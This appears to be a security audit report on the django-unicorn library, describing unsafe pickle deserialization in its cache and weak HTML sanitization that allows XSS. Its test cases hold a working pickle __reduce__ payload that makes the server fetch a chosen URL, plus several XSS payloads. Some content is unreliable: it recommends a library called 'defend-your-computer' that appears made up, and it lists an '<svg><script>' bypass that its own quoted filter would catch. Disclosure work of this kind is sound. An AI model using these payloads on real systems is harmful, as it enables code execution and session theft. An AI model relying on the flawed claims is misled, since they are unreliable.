### Vulnerability List for django-unicorn

#### 1. Server-Side Request Forgery (SSRF) via Pickle Deserialization in Cache

- **Vulnerability Name:** Server-Side Request Forgery (SSRF) via Pickle Deserialization in Cache
- **Description:**
    - Django-unicorn uses Django's caching mechanism to store component state, potentially improving performance and handling queued requests.
    - The `cache_full_tree` function in `django_unicorn/cacher.py` serializes the entire component tree using `pickle.dumps` and stores it in the cache.
    - The `restore_from_cache` function deserializes the component tree from the cache using `pickle.loads`.
    - Python's `pickle` module is known to be vulnerable to arbitrary code execution when deserializing untrusted data.
    - An attacker who can control the cached data could inject a malicious pickled payload, leading to Server-Side Request Forgery (SSRF) or Remote Code Execution (RCE) on the server when the component state is restored from the cache.
    - While direct external attacker control over the cache backend is typically not possible, if there are other vulnerabilities that allow an attacker to influence the cache content (e.g., cache poisoning, access to internal network or services that can modify cache), this can be exploited.
- **Impact:**
    - **Critical**
    - Successful exploitation can lead to Server-Side Request Forgery (SSRF), allowing an attacker to make requests on behalf of the server to internal or external resources. In more severe scenarios, depending on the environment and installed packages, it could potentially be escalated to Remote Code Execution (RCE) if the attacker crafts a malicious pickle payload carefully.
- **Vulnerability Rank:** Critical
- **Currently Implemented Mitigations:**
    - The documentation does not explicitly warn against the dangers of pickle deserialization or suggest alternative safer caching strategies if sensitive data is being cached or if the cache is potentially exposed to manipulation.
    - The code itself doesn't have any specific sanitization or validation on the data before deserializing it from the cache using `pickle.loads`.
- **Missing Mitigations:**
    - **Use of Safe Serialization Format:** Replace `pickle` with a safer serialization format like `orjson` or `jsonpickle` which are less prone to arbitrary code execution vulnerabilities. For caching, consider using formats like JSON or other structured formats after ensuring no code execution risk during deserialization.  `pyproject.toml` shows that `orjson` is already a dependency of the project, making it a viable alternative.
    - **Security Warning in Documentation:** Add a prominent security warning in the documentation about the risks of using pickle for caching, especially in environments where cache integrity cannot be fully guaranteed. Recommend safer alternatives and best practices.
- **Preconditions:**
    - Caching is enabled in django-unicorn (`settings.UNICORN['SERIAL']['ENABLED'] = True`).
    - An attacker has a way to influence the content of the cache. This might be through a separate vulnerability (e.g., cache poisoning, internal network access).
    - The application attempts to restore a component from the cache that was maliciously crafted.
- **Source Code Analysis:**
    - **django_unicorn\cacher.py:**
        ```python
        from django.core.cache import caches
        import pickle

        def cache_full_tree(component: "django_unicorn.views.UnicornView"):
            # ...
            cache = caches[get_cache_alias()]

            with CacheableComponent(root) as caching:
                for _component in caching.components():
                    cache.set(_component.component_cache_key, _component) # Serialization using pickle.dumps happens implicitly within cache.set

        def restore_from_cache(
                component_cache_key: str,
                request: Optional[HttpRequest] = None
            ) -> "django_unicorn.views.UnicornView":
            # ...
            cache = caches[get_cache_alias()]
            cached_component = cache.get(component_cache_key) # Deserialization using pickle.loads happens implicitly within cache.get
            # ...
            return cached_component
        ```
        - The code directly uses `cache.set` and `cache.get` which, by default with Django's cache backends when storing Python objects, will use `pickle` for serialization.
        - No sanitization is performed on the component data before caching or after retrieval.
        - If an attacker can somehow write to the cache, they can inject a malicious pickled object. When `restore_from_cache` is called to retrieve this component, `pickle.loads` will execute the malicious payload.
- **Security Test Case:**
    1. **Setup:**
        - Configure django-unicorn caching to be enabled (`settings.UNICORN['SERIAL']['ENABLED'] = True`).
        - Set up a Django Unicorn component that utilizes caching (e.g., a component that gets serialized/deserialized on each request or action).
        - Configure a cache backend (like `locmem` or `redis`).
    2. **Craft Malicious Payload:**
        - Create a malicious Python pickle payload that, when deserialized, performs a Server-Side Request Forgery (e.g., tries to access an internal service or an external URL) or attempts to execute arbitrary code (for demonstration purposes, a simple command execution or DNS lookup could be used initially).
        - Example malicious pickle payload (SSRF to internal service on port 8080):
          ```python
          import pickle
          import base64

          class SSRFPayload(object):
              def __reduce__(self):
                  import urllib.request
                  url = "http://localhost:8080"  # Replace with your target SSRF URL
                  return (urllib.request.urlopen, (url,))

          payload = SSRFPayload()
          pickled_payload = base64.b64encode(pickle.dumps(payload)).decode()
          print(pickled_payload)
          ```
    3. **Inject Payload into Cache:**
        - **This step simulates an attacker gaining control over the cache, which is a precondition.**
        - For testing purposes, directly manipulate the cache backend to inject the malicious pickled payload with a cache key that django-unicorn is expected to use.  If using `locmem` cache, you might be able to access and modify the cache dictionary directly in a test. For Redis or other backends, you'd need to use their respective client libraries to set the cache value.
        - Let's assume the component cache key is predictable or can be determined (for testing - in real scenarios, attacker would need to find or guess a valid key). Set the cache value for this key to the `pickled_payload`.
    4. **Trigger Component Restoration:**
        - Make a request to the django-unicorn application that triggers the `restore_from_cache` function to retrieve the component from the cache using the key where the malicious payload was injected. This might involve performing an action on a component or simply loading a page that renders a cached component.
    5. **Verify SSRF/RCE:**
        - Monitor network traffic or server logs to confirm if the SSRF payload was executed (e.g., request to `http://localhost:8080` is made).
        - If RCE payload was used, verify if the command was executed (e.g., by checking for side-effects like file creation, DNS lookups, or output in logs).

#### 2. Cross-Site Scripting (XSS) due to Inadequate HTML Sanitization

- **Vulnerability Name:** Cross-Site Scripting (XSS) due to Inadequate HTML Sanitization
- **Description:**
    - Django-unicorn uses a basic `sanitize_html` function in `django_unicorn/utils.py` to prevent Cross-Site Scripting (XSS) attacks.
    - This function, used in `django_unicorn/views/process_component_request.py`, only escapes `<script>` tags by replacing them with their HTML entities (`&lt;script&gt;`).
    - This sanitization is insufficient as it can be bypassed using various XSS vectors that do not involve `<script>` tags.
    - An attacker can inject malicious JavaScript code through other HTML tags and attributes, such as:
        - Event handlers: `onload`, `onerror`, `onmouseover`, etc. within tags like `<img>`, `<body>`, `<div>`, etc. For example, `<img src="x" onerror="alert('XSS')">`
        - HTML tags that can execute script: `<svg>`, `<object>`, `<iframe>`, `<embed>`, etc., potentially in combination with event handlers or specific attributes. For example, `<svg><script>alert('XSS')</script></svg>` or `<iframe src="javascript:alert('XSS')">`
        - Data attributes and attributes that can be manipulated by javascript to execute code.
    - By injecting these payloads into component data (e.g., through form inputs, URL parameters, or other means of data manipulation that are reflected in the rendered component), an attacker can execute arbitrary JavaScript code in the victim's browser when they view the page.
- **Impact:**
    - **High**
    - Successful exploitation can lead to Cross-Site Scripting (XSS). This allows an attacker to execute arbitrary JavaScript code in the victim's browser.
    - Consequences include:
        - **Session Hijacking:** Stealing session cookies to impersonate users.
        - **Defacement:** Modifying the content of the web page seen by the user.
        - **Redirection:** Redirecting users to malicious websites.
        - **Keylogging:** Capturing user input, including passwords and sensitive information.
        - **Malware Distribution:** Infecting users with malware.
- **Vulnerability Rank:** High
- **Currently Implemented Mitigations:**
    - **Basic `<script>` tag escaping:** The `sanitize_html` function in `django_unicorn/utils.py` escapes `<script>` tags. However, this is easily bypassed.
    - The `safe` Meta attribute in UnicornView components might offer some level of control, but it's not a comprehensive sanitization solution and depends on correct developer usage.
- **Missing Mitigations:**
    - **Robust HTML Sanitization:** Replace the current `sanitize_html` function with a robust and well-vetted HTML sanitization library like `bleach` or `defend-your-computer`. These libraries are designed to handle a wide range of XSS attack vectors and can properly sanitize HTML content to remove or neutralize malicious code while preserving safe HTML and CSS.
    - **Context-Aware Output Encoding:** Ensure context-aware output encoding is used in templates to prevent XSS. Django's template engine provides auto-escaping, which helps, but developers need to be aware of when to use `|safe` and the security implications. However, relying on `|safe` without proper sanitization is dangerous.
    - **Content Security Policy (CSP):** Implement and properly configure Content Security Policy (CSP) headers to mitigate the impact of XSS attacks by controlling the resources the browser is allowed to load and execute. CSP can act as a defense-in-depth mechanism.
- **Preconditions:**
    - An attacker can inject data into a component's properties. This could be through:
        - Form inputs (`unicorn:model`).
        - URL parameters (if component properties are derived from URL parameters).
        - Any other mechanism where user-controlled input can affect the component's data.
    - The injected data is rendered in the component's template without proper sanitization beyond the basic `<script>` tag escaping.
    - The developer is not explicitly using `|safe` template filter without understanding the security implications and proper sanitization beforehand (although even with `|safe`, proper sanitization should be applied to prevent XSS).
- **Source Code Analysis:**
    - **django_unicorn\utils.py:**
        ```python
        def sanitize_html(html: str) -> str:
            """
            Sanitizes html to prevent XSS.
            """

            if not html:
                return html

            html = html.replace("<script", "&lt;script")
            html = html.replace("</script", "&lt;/script")

            return html
        ```
        - The `sanitize_html` function only performs basic string replacement to escape `<script>` tags.
        - This is a woefully inadequate approach to HTML sanitization and XSS prevention.

    - **django_unicorn\views\process_component_request.py:**
        ```python
        def process_component_request(request: HttpRequest, component_name: str) -> JsonResponse:
            # ...
            component_data = component.get_frontend_context_variables()
            component_data_json = sanitize_html(component_data)
            # ...
        ```
        - `sanitize_html` is used to "sanitize" the component data before sending it to the frontend.
        - Because of the weak `sanitize_html` implementation, this does not effectively prevent XSS.

    - **django_unicorn\components\unicorn_view.py:**
        ```python
        class UnicornView(View):
            class Meta:
                exclude: tuple = ()
                javascript_exclude: tuple = ()
                safe: tuple = () # Potentially related to "safe" attributes but not robust XSS prevention

            def get_frontend_context_variables(self: "UnicornView") -> str:
                # ...
                exclude_field_attributes = self._meta_exclude_field_attributes()

                serialized_component = serializer.dumps(
                    component_context,
                    exclude_field_attributes=exclude_field_attributes,
                    indent=None,
                    sort_dict=True,
                    fix_floats=True,
                )

                return serialized_component
        ```
        - The `safe` Meta attribute is mentioned but does not seem to enforce or implement robust sanitization, and likely only controls which attributes are sent to the frontend without escaping.

- **Security Test Case:**
    1. **Setup:**
        - Create a Django Unicorn component that renders a property which can be influenced by user input (e.g., from a form field or URL parameter). For example, a component with a `message` property that is displayed in the template:
          ```python
          class XssComponent(UnicornView):
              template_name = "unicorn/xss_component.html"
              message = ""

              def mount(self):
                  self.message = self.component_kwargs.get("message", "")
          ```
          Template (`unicorn/xss_component.html`):
          ```html
          <div>
              <p>{{ unicorn.message }}</p>
          </div>
          ```
        2. **Craft XSS Payload:**
            - Create an XSS payload that bypasses the `<script>` tag sanitization. For example, use an `<img>` tag with an `onerror` event:
              ```html
              <img src="x" onerror="alert('XSS')">
              ```
        3. **Inject Payload:**
            - Inject the XSS payload into the component's `message` property. This can be simulated by manually constructing a Unicorn message or by creating a form that allows setting the `message` property via `unicorn:model`. For testing, you can directly modify the component's kwargs when rendering it in a view or test.
            - Example URL: `/?message=<img src="x" onerror="alert('XSS')">` and pass the message as kwargs to the component in the view.
        4. **Trigger Rendering:**
            - Render the component in a Django template and access the page in a browser.
        5. **Verify XSS:**
            - Check if the JavaScript code (`alert('XSS')`) is executed when the page loads. If an alert box appears, the XSS vulnerability is confirmed.
        6. **Alternative Payloads:**
            - Test with other XSS payloads to confirm the bypass, such as:
              - `<svg><script>alert('XSS')</script></svg>`
              - `<body onload="alert('XSS')">`
              - `<iframe src="javascript:alert('XSS')">`
              - `<div onmouseover="alert('XSS')">Hover Me</div>`

This vulnerability demonstrates that the current HTML sanitization in django-unicorn is insufficient to prevent XSS attacks. A robust sanitization library must be used to properly mitigate this risk.
